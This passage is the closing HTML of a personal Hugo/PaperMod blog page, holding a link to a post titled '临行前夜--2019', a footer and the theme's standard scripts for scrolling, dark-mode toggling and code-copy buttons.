  <a class="next" href="https://ch3n9w.github.io/posts/gossip-note-before-back/">
    <span class="title">Next »</span>
    <br>
    <span>临行前夜--2019</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.github.io/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
